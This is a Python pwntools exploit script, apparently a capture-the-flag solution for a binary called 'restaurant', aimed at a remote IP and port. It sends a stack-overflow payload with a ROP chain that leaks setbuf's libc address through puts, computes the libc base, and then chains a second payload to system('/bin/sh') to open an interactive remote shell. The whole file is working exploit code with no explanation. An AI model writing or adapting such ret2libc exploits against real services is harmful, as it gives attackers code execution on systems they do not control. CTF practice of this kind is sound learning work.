from pwn import *
context.log_level = 'debug'
context.arch = "amd64"

e = context.binary = ELF('restaurant')
# r= e.process()
r = remote('35.198.129.115',31513)
lib = e.libc
lib= ELF('libc6_2.27-3ubuntu1.4_amd64.so')

main=0x000000000040076c
pop_rdi_ret=0x00000000004008a3
ret=pop_rdi_ret+1
setbuf_got = 0x601020
puts_plt = 0x4005b0

r.sendlineafter(b">> ",b"3")
payload = b"a"*0x70+b"b"*8
payload+= flat(pop_rdi_ret, setbuf_got, puts_plt, main)
pause()
r.sendlineafter(b"eat:",payload)
# r.recvline()

setbuf_libc = u64(r.recv(6).ljust(8,b"\x00")) 
log.info("setbuf_libc: %#x" %setbuf_libc)
base_libc = setbuf_libc - lib.sym.setbuf
system_libc = base_libc + lib.sym.system
binsh_libc = base_libc + next(lib.search(b"/bin/sh"))
log.info("base_libc: %#x" %base_libc)
log.info("system_libc: %#x" %system_libc)
log.info("binsh_libc: %#x" %binsh_libc)

r.sendlineafter(b">> ",b"3")
payload = b"a"*0x70+b"b"*8
payload+= flat(ret, pop_rdi_ret, binsh_libc, system_libc, main)
pause()
r.sendlineafter(b"eat:",payload)

r.interactive()
